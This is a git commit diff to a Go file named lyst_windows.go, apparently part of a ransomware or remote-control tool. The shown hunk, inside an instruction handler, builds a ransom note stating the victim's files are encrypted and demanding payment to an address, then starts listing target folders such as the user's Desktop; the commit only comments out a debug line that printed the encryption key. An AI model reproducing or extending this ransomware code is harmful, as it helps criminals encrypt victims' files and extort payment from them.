ef9938cbbd881ed2e3b32676159dbc818533c03b
quicks <109902246+ThrillQuks@users.noreply.github.com>
2022-08-20 04:47:55 +0000

    Update lyst_windows.go

--- lyst_windows.go
+++ lyst_windows.go
@@ -598,7 +598,7 @@ func doInstru(ic, iv string) string {
 				out = "Error:" + err.Error()
 			} else {
 				text := fmt.Sprintf("All your files have been encrypted. Do not bother searching online. The only people on earth that can decrypt your files are us.\nTo start decryption process, send %s %s to this address:\n%s", ivspl[0], ivspl[1], ivspl[2])
-				fmt.Println("RANSOOOM", iv, key, text)
+				// fmt.Println("RANSOOOM", iv, key, text)
 
 				target_paths := []string{
 					mainDrive + "\\" + "Users\\" + username + "\\Desktop",
